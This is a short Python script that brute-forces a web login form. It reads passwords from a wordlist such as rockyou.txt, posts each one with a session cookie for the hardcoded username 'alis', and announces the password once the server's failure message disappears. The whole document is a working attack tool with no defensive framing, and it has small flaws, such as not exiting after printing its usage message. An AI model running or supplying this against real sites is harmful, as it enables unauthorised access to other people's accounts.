import requests
import sys

def Cracker(url,cookie,identifier,file):
    f = open(file,"rb")
    line = f.readlines()
    for line in line:
        data = {"username":"alis","password":f"{line.decode()}"}
        cookie = {"session":f"{cookie}"}
        r = requests.post(url,cookies=cookie,data=data)
        res_text = r.text
        if identifier not in res_text:
            print("PASSWORD IS CRACKED SUCCESFULLY!")
            sys.stdout.write("(+) password =>"+"\r"+ f"{line.decode()}")
            sys.stdout.flush()
            break
        else:
            print("Password =>"+line.decode())
            sys.stdout.write("\033[F")
            sys.stdout.flush()


def main():
    if len(sys.argv) != 5:
        print("(+) Usage: %s <url> <cookie> <identifier> <file_name>" % sys.argv[0])
        print("(+) Example: %s www.example.com <session_cookie> Invalid password rockyou.txt"% sys.argv[0])
    
    url = sys.argv[1]
    cookie = sys.argv[2]
    identifier = sys.argv[3] 
    file = sys.argv[4]
    print("(+) Retrieving password.....")
    Cracker(url,cookie,identifier,file)
    
        
if __name__ == "__main__":
    main()
    